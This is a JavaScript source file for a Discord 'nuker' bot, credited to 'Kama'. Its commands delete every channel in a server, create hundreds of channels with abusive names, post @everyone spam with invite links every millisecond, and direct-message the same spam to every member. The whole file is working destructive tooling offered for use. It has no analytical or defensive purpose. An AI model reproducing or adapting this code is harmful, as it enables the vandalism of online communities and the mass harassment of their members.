const {
  Client,
  ActivityType,
  Partials,
  GatewayIntentBits,
  Collection,
} = require("discord.js");
const { Guilds, GuildMembers, GuildMessages, MessageContent } = GatewayIntentBits;
const { User, Message, GuildMember, ThreadMember } = Partials;

const client = new Client({
  intents: [Guilds, GuildMembers, GuildMessages, MessageContent ],
  partials: [User, Message, GuildMember, ThreadMember],
});
client.config = require("./config.json");
client.login(client.config.TOKEN);
client.on('ready', () => {
  let aSName = `

▄▄▄       ██▀███  ▒███████▒▓█████  ██▀███   ▒█████  ▒██   ██▒  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
▒████▄    ▓██ ▒ ██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ▓██ ░▄█ ▒░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ▒██▀▀█▄    ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
▓█   ▓██▒░██▓ ▒██▒▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
▒▒   ▓▒█░░ ▒▓ ░▒▓░░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒   ▒▒ ░  ░▒ ░ ▒░░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
 ░   ▒     ░░   ░ ░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒   ░    ░  ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
     ░  ░   ░       ░ ░       ░  ░   ░         ░ ░   ░    ░        ░                 ░  ░       ░          ░      ░  ░   ░     
                  ░                                                                                                            
                                           
                                                     
                           Dev by Kama
                   Nuker: ${client.user.tag}
                   Prefix: ${client.config.PREFIX}
   `;

  console.clear();
  console.log(aSName);
});

client.on('messageCreate', async (message) => {
  console.log(message.content)
  if(message.content.startsWith("dc")) {
    message.guild.channels.cache.forEach((ch) => ch.delete())
  };

  if(message.content.startsWith("mc")) {
  for (let i = 0; i < 499; i++) {
                  if (message.guild.channels.cache.size === 499) break;
                  else {
                    console.log("cnl")
                      message.guild.channels.create({name: "Fucked by Kama", type: 0 })
                  }  
  };
  };
  
  if(message.content.startsWith("ping")) {
    console.log("pc")
    for (let i = 0; i < 499; i++) {
      if (message.guild.channels.cache.size === 499) { 
        break
      } else { message.guild.channels.create({name: `${message.author.username} fucked you`, type: 0 }).then((ch) => {
        setInterval(() => {
            ch.send(`@everyone nuke by kama Kimino on top https://discord.com/invite/MZ3Kr6kUq\nEVENT SUID GAME ICI VENEZ SAKO QUE DU FAKE https://discord.com/invite/jZzMnjv7Js\n@everyone faites ping en message`);
        }, 1);
      })};
    };
  };
  if(message.content.startsWith("dmall")) {
    const guild = message.guild;// Replace 'GUILD_ID' with your target guild's ID

    guild.members.cache.forEach((member) => {
      member.send('@everyone nuke by kama Kimino on top https://discord.com/invite/MZ3Kr6kUq\nEVENT SUID GAME ICI VENEZ SAKO QUE DU FAKE https://discord.com/invite/jZzMnjv7Js')
        .then(() => console.log(`Sent DM to ${member.user.tag}`))
        .catch((error) => console.error(`Failed to send DM to ${member.user.tag}: ${error}`));
    });
  }


})
